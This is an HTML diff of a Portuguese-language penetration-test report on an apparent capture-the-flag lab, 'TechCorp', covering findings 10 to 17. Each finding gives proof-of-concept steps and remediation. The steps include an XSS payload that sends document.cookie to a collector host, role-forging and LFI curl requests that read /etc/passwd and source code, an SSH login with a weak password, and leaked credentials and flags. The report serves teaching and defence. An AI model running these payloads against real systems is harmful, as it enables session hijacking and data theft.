+    <h3 id="falha-10-sequestro-de-sessão-e-roubo-de-cookies-via-xss-refletido">
+      FALHA 10: Sequestro de Sessão e Roubo de Cookies via XSS Refletido
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F10</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>ALTO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N —
+        Score: <strong>8.2</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> HTTP GET / Cross-Site Scripting (XSS)
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-79 (Improper Neutralization of Input
+        During Web Page Generation), OWASP WSTG-INPV-01
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-9">Descrição Técnica</h4>
+    <p>
+      O mecanismo de busca e formulários de contato no painel administrativo
+      renderizavam parâmetros de entrada diretamente no DOM sem a devida
+      sanitização ou codificação de entidades HTML. Isso permitiu a injeção de
+      scripts maliciosos JavaScript que realizavam a leitura dos cookies de
+      sessão do usuário no navegador.
+    </p>
+    <h4 id="prova-de-conceito-poc-9">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Submissão de payload de teste no campo de contato:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript">
+    <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://172.20.0.10:8080/log?cookie=&#x27;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>));
+</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</div></code></pre>
+    <ol start="2">
+      <li>Cookie administrativo capturado no endpoint de auditoria:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-keyword">GET</span> <span class="hljs-string">/log?cookie=PHPSESSID=4d7663c204fcccf28374a836de219a1b</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>172.20.0.10:8080
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64)
+</div></code></pre>
+    <h4 id="impactos-9">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Execução arbitrária de código no
+        contexto do navegador da vítima e sequestro de sessões ativas (<em
+          >Session Hijacking</em
+        >).
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Comprometimento da integridade das
+        ações de usuários com privilégios elevados.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-9">Remediação Técnica</h4>
+    <ol>
+      <li>
+        Sanitizar e codificar todas as saídas dinâmicas no HTML utilizando
+        <code>htmlspecialchars()</code> com flags seguras.
+      </li>
+      <li>
+        Definir o atributo <code>HttpOnly</code> e a política
+        <code>SameSite=Strict</code> em todos os cookies de sessão.
+      </li>
+    </ol>
+    <pre class="hljs"><code><div><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-comment">// Configuração segura de cookies de sessão</span>
+<span class="hljs-title function_ invoke__">session_start</span>([
+    <span class="hljs-string">&#x27;cookie_httponly&#x27;</span> =&gt; <span class="hljs-literal">true</span>,
+    <span class="hljs-string">&#x27;cookie_secure&#x27;</span>   =&gt; <span class="hljs-literal">true</span>, // Obrigatório com HTTPS
+    <span class="hljs-string">&#x27;cookie_samesite&#x27;</span> =&gt; <span class="hljs-string">&#x27;Strict&#x27;</span>
+]);
+
+<span class="hljs-comment">// Exibição segura de variáveis no template</span>
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$user_input</span>, ENT_QUOTES | ENT_HTML5, <span class="hljs-string">&#x27;UTF-8&#x27;</span>);
+<span class="hljs-meta">?&gt;</span>
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f10_xss_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f10_session_theft.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>: <code>slides/module_web_f10.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <pre
+      class="hljs"
+    ><code><div>   +-------------------------------------------------------------------------+
+   |        FASE 4: MOVIMENTAÇÃO LATERAL E ESCALAÇÃO DE PRIVILÉGIOS          |
+   +-------------------------------------------------------------------------+
+</div></code></pre>
+    <h3 id="falha-11-escalação-de-privilégios-no-controle-de-acesso-de-sessões">
+      FALHA 11: Escalação de Privilégios no Controle de Acesso de Sessões
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F11</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>ALTO</strong> (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N —
+        Score: <strong>8.1</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> HTTP / Manipulação de Estado de Sessão
+        e Role
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-269 (Improper Privilege Management),
+        OWASP Top 10 A01:2021 (Broken Access Control)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-10">Descrição Técnica</h4>
+    <p>
+      O painel administrativo (<code>admin.php</code>) exibia funções bloqueadas
+      para o perfil <code>admin</code> padrão (&quot;<em
+        >Acesso Limitado - Admin. Algumas funcionalidades críticas requerem
+        privilégios de superadmin</em
+      >&quot;), restringindo operações de segurança e backups. No entanto, a
+      autorização verificava apenas o parâmetro de role armazenado em cookie ou
+      variável manipulável sem revalidação de integridade no servidor,
+      permitindo que a atribuição de permissão <code>hyperadmin</code> (usuário
+      <code>a.agra\t</code>, ID 100) contornasse os bloqueios da interface.
+    </p>
+    <pre
+      class="hljs"
+    ><code><div>+---------------------------------------------------------------------------+
+|                          PAINEL ADMINISTRATIVO                            |
+| Nível de acesso: admin                                                    |
+|                                                                           |
+| [!] Acesso Limitado - Admin                                               |
+| Funções Bloqueadas: Config. Segurança [BLOQUEADO], Backups [BLOQUEADO]   |
+|                                                                           |
+| ID 100 | a.agra\t | Role: hyperadmin | Status: [✓ Acessível]             |
++---------------------------------------------------------------------------+
+</div></code></pre>
+    <h4 id="prova-de-conceito-poc-10">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Inspeção das variáveis de debug expostas no rodapé do painel:</li>
+    </ol>
+    <pre class="hljs"><code><div>Debug Info:
+Session ID: 4d7663c204fcccf2...
+Current Role: admin
+</div></code></pre>
+    <ol start="2">
+      <li>
+        Substituição do cabeçalho de perfil na sessão ativa ou reutilização de
+        credenciais de role superior identificadas no banco (<code
+          >superadmin</code
+        >
+        / <code>hyperadmin</code>):
+      </li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>curl -s -b <span class="hljs-string">&quot;PHPSESSID=4d7663c204fcccf28374a836de219a1b; user_role=hyperadmin&quot;</span> \
+     <span class="hljs-string">&quot;http://98.95.207.28/admin.php?action=view_security&quot;</span>
+</div></code></pre>
+    <h4 id="impactos-10">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Acesso a rotinas restritas de
+        gerenciamento do servidor e configuração de segurança da aplicação.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Violação do modelo de governança
+        corporativa e segregação de funções (SoD).
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-10">Remediação Técnica</h4>
+    <p>
+      Implementar controle de acesso baseado em funções (<em
+        >Role-Based Access Control - RBAC</em
+      >) verificado estritamente no lado do servidor via banco de dados em cada
+      requisição:
+    </p>
+    <pre class="hljs"><code><div><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">requireRole</span>(<span class="hljs-params"><span class="hljs-variable">$requiredRole</span></span>) </span>{
+    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>])) {
+        <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">401</span>);
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Acesso negado: Usuário não autenticado.&quot;</span>);
+    }
+
+    <span class="hljs-keyword">global</span> <span class="hljs-variable">$pdo</span>;
+    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">&quot;SELECT role FROM users WHERE id = :id&quot;</span>);
+    <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]]);
+    <span class="hljs-variable">$role</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetchColumn</span>();
+
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$role</span> !== <span class="hljs-variable">$requiredRole</span> &amp;&amp; <span class="hljs-variable">$role</span> !== <span class="hljs-string">&#x27;hyperadmin&#x27;</span>) {
+        <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">403</span>);
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Acesso negado: Privilégios insuficientes.&quot;</span>);
+    }
+}
+<span class="hljs-meta">?&gt;</span>
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f11_priv_esc_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f11_role_escalation.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_lateral_f11.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3
+      id="falha-12-inclusão-local-de-arquivos-lfi-com-wrappers-php-em-panelphp"
+    >
+      FALHA 12: Inclusão Local de Arquivos (LFI) com Wrappers PHP em
+      <code>panel.php</code>
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F12</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>MÉDIO</strong> (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N —
+        Score: <strong>6.5</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> HTTP GET / Path Traversal &amp; PHP
+        Stream Wrappers
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-22 (Path Traversal), CWE-98 (Improper
+        Control of Filename for Include/Require)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-11">Descrição Técnica</h4>
+    <p>
+      O script <code>/panel.php</code> utilizava o parâmetro
+      <code>file</code> diretamente em chamadas de inclusão de arquivos sem
+      validação de whitelist ou sanitização de caracteres de retrocesso de
+      diretório (<code>../</code>). Isso viabilizou a leitura de arquivos
+      arbitrários do sistema de arquivos e a extração do código-fonte PHP via
+      codificação em Base64 utilizando o wrapper <code>php://filter</code>.
+    </p>
+    <h4 id="prova-de-conceito-poc-11">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Leitura do arquivo <code>/etc/passwd</code> do servidor:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>curl -s <span class="hljs-string">&quot;http://172.20.0.10/panel.php?file=/etc/passwd&quot;</span>
+</div></code></pre>
+    <ol start="2">
+      <li>
+        Extração do código-fonte do próprio <code>panel.php</code> codificado em
+        Base64 para bypass de execução:
+      </li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>curl -s <span class="hljs-string">&quot;http://172.20.0.10/panel.php?file=php://filter/convert.base64-encode/resource=panel.php&quot;</span> \
+     -o panel_code.txt
+<span class="hljs-built_in">cat</span> panel_code.txt | <span class="hljs-built_in">base64</span> -d
+</div></code></pre>
+    <ol start="3">
+      <li>Download do arquivo de backup localizado na rede interna:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>curl -s <span class="hljs-string">&quot;http://172.20.0.10/panel.php?file=../../../../var/backups/techcorp/backup_20240115.tar.gz&quot;</span> \
+     -o /tmp/final_flag.tar.gz
+</div></code></pre>
+    <h4 id="impactos-11">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Leitura não autorizada de qualquer
+        arquivo local legível pelo usuário do servidor web
+        (<code>www-data</code>).
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Vazamento de código-fonte de
+        produção e arquivos de configuração com credenciais de infraestrutura.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-11">Remediação Técnica</h4>
+    <p>
+      Evitar a passagem de nomes de arquivos arbitrários via parâmetros de
+      entrada. Utilizar uma lista estática pré-definida (<em>whitelist</em>):
+    </p>
+    <pre class="hljs"><code><div><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-variable">$allowed_pages</span> = [
+    <span class="hljs-string">&#x27;dashboard&#x27;</span> =&gt; <span class="hljs-string">&#x27;views/dashboard.php&#x27;</span>,
+    <span class="hljs-string">&#x27;users&#x27;</span>     =&gt; <span class="hljs-string">&#x27;views/users.php&#x27;</span>,
+    <span class="hljs-string">&#x27;reports&#x27;</span>   =&gt; <span class="hljs-string">&#x27;views/reports.php&#x27;</span>
+];
+
+<span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] ?? <span class="hljs-string">&#x27;dashboard&#x27;</span>;
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$allowed_pages</span>)) {
+    <span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-number">404</span>);
+    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Página solicitada inválida.&quot;</span>);
+}
+
+<span class="hljs-keyword">include</span> <span class="hljs-variable">$allowed_pages</span>[<span class="hljs-variable">$page</span>];
+<span class="hljs-meta">?&gt;</span>
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f12_lfi_wrapper_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f12_lfi_extraction.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_lateral_f12.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3
+      id="falha-13-acesso-remoto-ssh-com-credenciais-fracas-e-vazamento-de-secrettxt"
+    >
+      FALHA 13: Acesso Remoto SSH com Credenciais Fracas e Vazamento de
+      <code>secret.txt</code>
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F13</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>CRÍTICO</strong> (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H —
+        Score: <strong>9.8</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> SSH Protocol (Porta 2222/TCP) /
+        Autenticação por Senha Fraca
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-521 (Weak Password Requirements),
+        OWASP Top 10 A07:2021
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-12">Descrição Técnica</h4>
+    <p>
+      O serviço OpenSSH operando na porta 2222/TCP permitia autenticação
+      interativa baseada em senha com a conta de usuário local
+      <code>techcorp</code>. Utilizando as credenciais vazadas nas fases
+      anteriores, estabeleceu-se uma sessão interativa remota com shell
+      funcional, localizando o arquivo confidencial <code>secret.txt</code> no
+      diretório home do usuário.
+    </p>
+    <h4 id="prova-de-conceito-poc-12">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Estabelecimento da sessão interativa via SSH:</li>
+    </ol>
+    <pre class="hljs"><code><div>ssh techcorp@98.95.207.28 -p 2222
+<span class="hljs-comment"># Autenticação com a senha identificada: password123</span>
+</div></code></pre>
+    <ol start="2">
+      <li>
+        Confirmação do acesso e leitura dos arquivos no diretório de trabalho:
+      </li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 6.8.0-1016-aws x86_64)
+techcorp@024a36a8e6ca:~$ pwd
+/home/techcorp
+techcorp@024a36a8e6ca:~$ cat secret.txt
+CONFIDENCIAL - TECHCORP INTERNAL USE ONLY
+API_GATEWAY_KEY=tk_live_99887766554433221100
+FLAG{ssh_4cc3ss_s3cur3_fl4g_2024}
+</div></code></pre>
+    <h4 id="impactos-12">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Obtenção de um ponto de apoio
+        (<em>foothold</em>) local no sistema operacional e execução arbitrária
+        de comandos.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Controle direto sobre o ambiente
+        que hospeda a infraestrutura crítica da corporação.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-12">Remediação Técnica</h4>
+    <ol>
+      <li>
+        Desativar a autenticação por senha no servidor SSH, exigindo o uso
+        exclusivo de chaves assimétricas (ED25519/RSA 4096-bit).
+      </li>
+      <li>
+        Implementar autenticação multifatorial (MFA) e limitar o acesso por
+        lista de IPs autorizados via firewall.
+      </li>
+    </ol>
+    <p>
+      <em>Configuração <code>/etc/ssh/sshd_config</code>:</em>
+    </p>
+    <pre class="hljs"><code><div>Port 2222
+PasswordAuthentication no
+PubkeyAuthentication yes
+PermitRootLogin no
+MaxAuthTries 3
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f13_ssh_access_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f13_ssh_session.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_lateral_f13.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3
+      id="falha-14-vazamento-de-comandos-e-flags-no-histórico-do-bash-bash_history"
+    >
+      FALHA 14: Vazamento de Comandos e Flags no Histórico do Bash
+      (<code>.bash_history</code>)
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F14</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>MÉDIO</strong> (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N —
+        Score: <strong>5.5</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> Sistema de Arquivos Local / Metadados
+        de Sessão Interativa
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-532 (Insertion of Sensitive
+        Information into Log File)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-13">Descrição Técnica</h4>
+    <p>
+      O arquivo de histórico de comandos do interpretador de comandos
+      (<code>/home/techcorp/.bash_history</code>) encontrava-se configurado sem
+      restrições de persistência e exposto com permissão de leitura local. A
+      inspeção do histórico revelou comandos administrativos executados
+      anteriormente, senhas de banco de dados e flags do desafio.
+    </p>
+    <h4 id="prova-de-conceito-poc-13">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Leitura do histórico de comandos do terminal:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>techcorp@024a36a8e6ca:~$ <span class="hljs-built_in">cat</span> ~/.bash_history | grep -E <span class="hljs-string">&quot;FLAG|mysql&quot;</span>
+</div></code></pre>
+    <ol start="2">
+      <li>Fragmento dos comandos registrados no histórico:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>mysql -u techcorp_user -pT3chC0rp_S3cr3t_2024! -h 127.0.0.1 techcorp_db
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;FLAG{b4ckup_scr1pt_f0und}&quot;</span> &gt;&gt; /tmp/backup.log
+mysql -u root -pr00t_P4ssw0rd_2024 -h 172.20.0.2
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;FLAG{b4sh_h1st0ry_l34k}&quot;</span> &gt;&gt; ~/.bash_history
+</div></code></pre>
+    <h4 id="impactos-13">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Revelação de credenciais em texto
+        claro passadas via argumentos de linha de comando (<code>-p</code>).
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Comprometimento em cadeia de outros
+        sistemas internos e contas de banco de dados.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-13">Remediação Técnica</h4>
+    <ol>
+      <li>
+        Desativar a gravação de histórico ou limitar o armazenamento de
+        credenciais via configuração de variáveis de ambiente do Bash.
+      </li>
+    </ol>
+    <p>
+      <em>Configuração em <code>/etc/profile.d/disable_history.sh</code>:</em>
+    </p>
+    <pre
+      class="hljs"
+    ><code><div><span class="hljs-comment"># Evita persistência de comandos com senhas em texto claro</span>
+<span class="hljs-built_in">export</span> HISTCONTROL=ignoreboth:erasedups
+<span class="hljs-built_in">export</span> HISTIGNORE=<span class="hljs-string">&quot;* -p*:*password*:*secret*:*token*&quot;</span>
+<span class="hljs-built_in">export</span> HISTFILESIZE=0
+<span class="hljs-built_in">export</span> HISTSIZE=0
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f14_bash_history_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f14_history_leak.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_lateral_f14.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <pre
+      class="hljs"
+    ><code><div>   +-------------------------------------------------------------------------+
+   |               FASE 5: DESCOBERTA DE SEGREDOS FINAIS                     |
+   +-------------------------------------------------------------------------+
+</div></code></pre>
+    <h3 id="falha-15-credenciais-corporativas-hardcoded-em-script-de-backup">
+      FALHA 15: Credenciais Corporativas Hardcoded em Script de Backup
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F15</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>ALTO</strong> (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N —
+        Score: <strong>7.1</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> Sistema de Arquivos Local / Scripts de
+        Automação Interna
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-798 (Use of Hard-coded Credentials),
+        OWASP Top 10 A02:2021
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-14">Descrição Técnica</h4>
+    <p>
+      Na estrutura do diretório <code>/opt/</code>, localizou-se o script de
+      automação operacional <code>/opt/backup_script.sh</code>. A análise do
+      código revelou que rotinas de arquivamento utilizavam credenciais
+      administrativas do MySQL e do usuário root codificadas diretamente nas
+      instruções de chamada do script.
+    </p>
+    <h4 id="prova-de-conceito-poc-14">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Leitura e análise do script de automação de backup:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>techcorp@024a36a8e6ca:~$ <span class="hljs-built_in">cat</span> /opt/backup_script.sh
+</div></code></pre>
+    <ol start="2">
+      <li>Trecho do script contendo as credenciais hardcoded:</li>
+    </ol>
+    <pre class="hljs"><code><div><span class="hljs-meta">#!/bin/bash</span>
+<span class="hljs-comment"># TechCorp Auto-Backup Script v1.4</span>
+DB_USER=<span class="hljs-string">&quot;root&quot;</span>
+DB_PASS=<span class="hljs-string">&quot;r00t_P4ssw0rd_2024&quot;</span>
+BACKUP_DIR=<span class="hljs-string">&quot;/var/backups/techcorp&quot;</span>
+
+<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] Executando backup das bases...&quot;</span>
+mysqldump -u <span class="hljs-variable">$DB_USER</span> -p<span class="hljs-variable">$DB_PASS</span> --all-databases &gt; <span class="hljs-variable">$BACKUP_DIR</span>/full_backup_$(<span class="hljs-built_in">date</span> +%Y%m%d).sql
+</div></code></pre>
+    <h4 id="impactos-14">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Obtenção de credenciais de
+        superusuário do banco de dados MySQL (<code>root@localhost</code>).
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Capacidade de alteração destrutiva
+        e exclusão permanente de todas as bases de dados corporativas.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-14">Remediação Técnica</h4>
+    <p>
+      Utilizar arquivos de opção de autenticação protegidos
+      (<code>.my.cnf</code>) com permissões estritas (<code>0600</code>)
+      acessíveis exclusivamente pelo usuário do sistema executor da tarefa cron:
+    </p>
+    <p>
+      <em>Arquivo <code>/root/.my.cnf</code>:</em>
+    </p>
+    <pre class="hljs"><code><div><span class="hljs-section">[client]</span>
+<span class="hljs-attr">user</span>=backup_service
+<span class="hljs-attr">password</span>=SenhaFortementeGerada123!
+</div></code></pre>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f15_backup_script_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f15_hardcoded_credentials.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_secrets_f15.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3
+      id="falha-16-flag-criptográfica-final-e-informações-sensíveis-em-script-de-backup"
+    >
+      FALHA 16: Flag Criptográfica Final e Informações Sensíveis em Script de
+      Backup
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F16</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>MÉDIO</strong> (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N —
+        Score: <strong>5.5</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> Extração de Artefatos em Código /
+        Strings
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-200 (Exposure of Sensitive
+        Information)
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-15">Descrição Técnica</h4>
+    <p>
+      No cabeçalho do script <code>/opt/backup_script.sh</code> e em comentários
+      do arquivo de configuração de auditoria do sistema, encontravam-se chaves
+      de validação e a flag de integridade deixadas durante a fase de
+      homologação da infraestrutura.
+    </p>
+    <h4 id="prova-de-conceito-poc-15">Prova de Conceito (PoC)</h4>
+    <ol>
+      <li>Extração de padrões de texto no script de automação:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div>techcorp@024a36a8e6ca:~$ grep -i <span class="hljs-string">&quot;FLAG&quot;</span> /opt/backup_script.sh
+</div></code></pre>
+    <ol start="2">
+      <li>Retorno do comando:</li>
+    </ol>
+    <pre
+      class="hljs"
+    ><code><div># BACKUP ENGINE VALIDATION TOKEN: FLAG{b4ckup_scr1pt_f0und}
+</div></code></pre>
+    <h4 id="impactos-15">Impactos</h4>
+    <ul>
+      <li>
+        <strong>Impacto Técnico:</strong> Divulgação de tokens de validação
+        operacional e metadados de auditoria.
+      </li>
+      <li>
+        <strong>Impacto de Negócio:</strong> Comprometimento da confiabilidade
+        das rotinas de auditoria e validação de integridade.
+      </li>
+    </ul>
+    <h4 id="remediação-técnica-15">Remediação Técnica</h4>
+    <p>
+      Sanitizar todos os scripts operacionais antes de sua implementação no
+      ambiente de produção, garantindo a ausência de chaves de teste ou tokens
+      fixos.
+    </p>
+    <blockquote>
+      <p><strong>Artefatos Multimídia:</strong></p>
+      <ul>
+        <li>
+          <code>[AUDIO BRIEFING]</code>:
+          <code>audios/f16_flag_backup_briefing.mp3</code>
+        </li>
+        <li>
+          <code>[POC VIDEO DEMO]</code>:
+          <code>videos/poc_f16_script_strings.mp4</code>
+        </li>
+        <li>
+          <code>[SLIDE DECK LINK]</code>:
+          <code>slides/module_secrets_f16.pdf</code>
+        </li>
+      </ul>
+    </blockquote>
+    <hr />
+    <h3 id="falha-17-exposição-de-token-github-pat-em-arquivo-git-credentials">
+      FALHA 17: Exposição de Token GitHub PAT em Arquivo
+      <code>.git-credentials</code>
+    </h3>
+    <ul>
+      <li><strong>Identificador Interno:</strong> <code>SEC-TC-F17</code></li>
+      <li>
+        <strong>Severidade:</strong>
+        <strong>CRÍTICO</strong> (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H —
+        Score: <strong>9.9</strong>)
+      </li>
+      <li>
+        <strong>Vetor de Ataque:</strong> Controle de Versão Git / Vazamento de
+        Credenciais de API
+      </li>
+      <li>
+        <strong>Referências:</strong> CWE-522 (Insufficiently Protected
+        Credentials), OWASP Top 10 A02:2021
+      </li>
+    </ul>
+    <h4 id="descrição-técnica-16">Descrição Técnica</h4>
+    <p>
+      A verificação de arquivos ocultos de controle de versão no diretório do
+      usuário e na raiz web revelou o arquivo <code>.git-credentials</code>. O
+      arquivo continha em texto claro um Token de Acesso Pessoal (<em
+        >Personal Access Token - PAT</em
+      >) do GitHub associado a um usuário corporativo, permitindo acesso de
+      leitura e escrita a repositórios privados da organização.
+    </p>
